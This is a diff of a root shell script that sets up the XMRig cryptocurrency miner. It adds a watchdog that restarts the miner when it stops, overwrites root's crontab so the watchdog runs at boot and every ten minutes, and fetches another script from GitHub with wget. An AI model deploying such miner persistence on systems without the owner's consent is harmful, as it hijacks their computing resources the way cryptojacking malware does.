@@ -22,9 +22,24 @@ sudo /root/xmrig-6.21.0/xmrig --donate-level 1 --threads=6 --background -o $fast
 EOF
 chmod +x /root/danielchau.sh
 
+cat /dev/null > /root/checkXMRIG.sh
+cat >>/root/checkXMRIG.sh <<EOF
+#!/bin/bash
+if pgrep xmrig >/dev/null
+then
+  echo "xmrig is running."
+else
+  echo "xmrig isn't running"
+  bash kill_miniZeph.sh
+  bash danielchau.sh
+fi
+EOF
+chmod +x /root/checkXMRIG.sh
+
 cat /dev/null > /var/spool/cron/crontabs/root
 cat >>/var/spool/cron/crontabs/root<<EOF
-@reboot /root/danielchau.sh*
+@reboot /root/checkXMRIG.sh > /root/checkxmrig.log
+*/10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
 EOF
 
 wget "https://raw.githubusercontent.com/minhchau91/createproxy/main/kill_miniZeph.sh" --output-document=/root/kill_miniZeph.sh
